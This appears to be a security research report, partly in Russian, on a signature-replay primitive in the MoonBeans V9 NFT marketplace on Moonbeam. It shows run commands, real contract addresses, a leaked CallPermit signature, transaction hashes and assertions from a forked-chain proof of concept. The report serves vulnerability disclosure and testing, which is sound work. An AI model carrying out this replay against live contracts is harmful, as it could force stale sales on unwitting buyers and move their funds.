# MoonBeans V9 seller-controlled revert primitive: CallPermit fork PoC

**Дата:** 2026-05-12  
**Verdict:** `SELLER_CONTROLLED_REPLAY_SUCCEEDED`  
**Скрипт:** `research/replay_moonbeans_seller_controlled_revert_chopsticks.js`  
**Результат:** `research/replay_moonbeans_seller_controlled_revert_result.json`

---

## 1. Цель проверки

Проверить, может ли seller сам намеренно создать failed CallPermit dispatch для `acceptOffer(...)`, раскрыть публичный reusable `v/r/s`, а затем после восстановления состояния тот же calldata replay'ится и исполняет stale sale.

Target:

```text
Marketplace V9: 0x683724817a7d526d6256Aec0D6f8ddF541b924de
CallPermit:     0x000000000000000000000000000000000000080a
```

Function:

```solidity
acceptOffer(address ca,uint256 tokenId,uint256 price,address from,bool escrowedBid)
```

Real fork contracts:

```text
WGLMR:  0xAcc15dC74880C9944775448304B263D191c6077F
ERC721: 0x104b904e19fBDa76bb864731A2C9E01E6b41f855
tokenId: 1549
```

No mock Solidity contracts used.

---

## 2. Как запустить

```powershell
.\node_modules\.bin\chopsticks.cmd --config=moonbeam --port 8015 --build-block-mode Instant
```

```powershell
$env:CHOPSTICKS_WS='ws://127.0.0.1:8015'
$env:RESULT_PATH='research\replay_moonbeans_seller_controlled_revert_result.json'
node research\replay_moonbeans_seller_controlled_revert_chopsticks.js
```

Expected:

```text
SELLER_CONTROLLED_REPLAY_SUCCEEDED
```

---

## 3. Actors

```text
Seller / signer / failed dispatch sender:
0xE2823B3C9Eef89520617589c2056Fde633B61C53

Buyer:
0x0d0E74c0f8c790C89945B852fa8A5708516641D4

Unrelated replay dispatcher:
0x387d113949a1a2D5Df01B869aa992e94Bd062035
```

Replay dispatcher is unrelated to seller and buyer.

---

## 4. Signed Authorization

Seller signs CallPermit for:

```text
acceptOffer(
  ca          = 0x104b904e19fBDa76bb864731A2C9E01E6b41f855,
  tokenId     = 1549,
  price       = 100000000000000000000,
  from        = 0x0d0E74c0f8c790C89945B852fa8A5708516641D4,
  escrowedBid = false
)
```

Inner calldata hash:

```text
0x676f2cec04dc4d8d554ca1c253af4451c3a2d3a78faf7d00e76c559c344878bb
```

Full CallPermit dispatch calldata hash:

```text
0x945b4388c1e237e74b6cf9706be59c608adc324224be66edc3e2ab97ed2fe0b5
```

Signature:

```text
v = 28
r = 0x940aba34d582721c4addb492830ebb58c5b2cc80fcca9f94bada5f5900508be8
s = 0x500c6381f91e90e7c7b8a8a80f1108a15499b881f8e6fd0e3fa6506a967efcf0
```

Signed nonce:

```text
0
```

---

## 5. Setup

Buyer creates a real non-escrowed offer:

```text
makeOffer tx:
0xfa271e6337dd395f2f10fe9c5dc9765ce482fa432e6c4ae68acb8985124912b2
```

Offer before failure:

```json
{
  "price": "100000000000000000000",
  "accepted": false,
  "buyer": "0x0d0E74c0f8c790C89945B852fa8A5708516641D4",
  "escrowed": false
}
```

Seller initially owns NFT and buyer has WGLMR allowance:

```text
NFT owner:        seller
Seller NFT bal:   1
Buyer WGLMR:      100000000000000000000
Buyer allowance:  100000000000000000000
```

---

## 6. Seller-Controlled Failure

Seller intentionally revokes marketplace NFT approval:

```text
setApprovalForAll(marketplace, false) tx:
0xa5f50208251ec512d8ad4a8c08e74bd8ad4e8d34efaf65a23b73b82702fc4aa1
```

State before failed dispatch:

```text
CallPermit nonce:                 0
NFT owner:                        seller
sellerApprovedForMarketplace:     false
Buyer allowance:                  100000000000000000000
Seller WGLMR:                     100000000000000000000
Buyer WGLMR:                      100000000000000000000
Offer accepted:                   false
```

Seller then sends the CallPermit dispatch himself.

Failed dispatch:

```text
tx:
0x0c9c7e359eb469fbc12c4dc99bf9789d32547c274ba4510f484c7d37056929f7

tx input hash:
0x945b4388c1e237e74b6cf9706be59c608adc324224be66edc3e2ab97ed2fe0b5
```

Observed revert:

```text
Marketplace not approved to tr
```

The runtime truncates the revert string in event output. It maps to this exact source condition:

```solidity
require(_nft.isApprovedForAll(msg.sender, address(this)), "Marketplace not approved to transfer this NFT.");
```

This proves:

- permit validation passed;
- target `acceptOffer(...)` was reached;
- revert happened inside marketplace before token/NFT transfer.

Nonce after failed dispatch:

```text
0
```

---

## 7. Atomicity Checks

All atomicity assertions passed:

```json
{
  "nonceRolledBack": true,
  "wglmrTransferRolledBack": true,
  "offerAcceptedRolledBack": true,
  "nftTransferRolledBack": true
}
```

Before and after failed dispatch:

```text
CallPermit nonce: 0 -> 0
NFT owner:        seller -> seller
Seller WGLMR:     100 WGLMR -> 100 WGLMR
Buyer WGLMR:      100 WGLMR -> 100 WGLMR
Offer accepted:   false -> false
```

So the failed target call fully rolled back:

- no WGLMR transfer remained;
- no NFT transfer remained;
- offer was not marked accepted;
- CallPermit nonce was not consumed.

---

## 8. Restore And Replay

Seller restores marketplace approval:

```text
setApprovalForAll(marketplace, true) tx:
0xc8502546e235b9583880d16da4e280fb5f6eb158291294ae0aa5f90089afd56e
```

Unrelated account replays exact same dispatch calldata:

```text
replay tx:
0x581ed5619e0bc525c9b1ecec68d1f462ba2224513130adb70d6e0a2a7d0ec6c7

replay input hash:
0x945b4388c1e237e74b6cf9706be59c608adc324224be66edc3e2ab97ed2fe0b5

exact same calldata reused:
true
```

Replay result:

```text
CallPermit nonce: 0 -> 1
NFT owner:        seller -> buyer
Seller NFT bal:   1 -> 0
Buyer NFT bal:    0 -> 1
Seller WGLMR:     100 WGLMR -> 200 WGLMR
Buyer WGLMR:      100 WGLMR -> 0
Offer accepted:   false -> true
```

Payment:

```text
Seller received: 100000000000000000000
Buyer paid:      100000000000000000000
```

---

## 9. Assertions

All assertions passed:

```json
{
  "permitValidationPassedAndTargetReverted": true,
  "sellerControlsRevertByApproval": true,
  "leakedReusableSignature": true,
  "exactSameCalldataReusable": true,
  "unrelatedReplayDispatcherWorks": true,
  "replaySucceeded": true,
  "nonceUnchangedAfterFail": true,
  "nonceConsumedAfterReplay": true,
  "paymentAndNftMovedOnlyOnReplay": true,
  "wglmrRolledBackOnFail": true,
  "offerAcceptedRolledBackOnFail": true,
  "nftRolledBackOnFail": true
}
```

---

## 10. Verdict

```text
SELLER_CONTROLLED_REPLAY_SUCCEEDED
```

Seller-controlled revert primitive exists.

The seller can:

1. own the NFT;
2. sign valid CallPermit `acceptOffer(...)`;
3. revoke marketplace ERC721 approval;
4. publish the signed CallPermit dispatch himself;
5. make the target call revert inside `acceptOffer`;
6. leak public reusable `v/r/s` and calldata;
7. keep CallPermit nonce unchanged;
8. restore approval later;
9. allow an unrelated dispatcher to replay exact same calldata;
10. complete the stale sale only on successful replay.

This is not blocked by atomicity. Atomicity actually preserves the exploit primitive: WGLMR/NFT/offer state are rolled back, but because the CallPermit nonce is also rolled back, the public signature remains reusable.

---

## 11. Interpretation

This is a stronger primitive than the buyer-controlled allowance failure in one important way: the signer/seller can independently create the failed target condition by controlling ERC721 approval.

It proves a self-published delayed authorization pattern:

```text
valid permit -> target revert controlled by seller -> public reusable signature -> later exact replay
```

The failure is temporary and controllable:

```text
approval false => fail
approval true  => replay succeeds
```

The same signed authorization is not consumed until the successful replay.
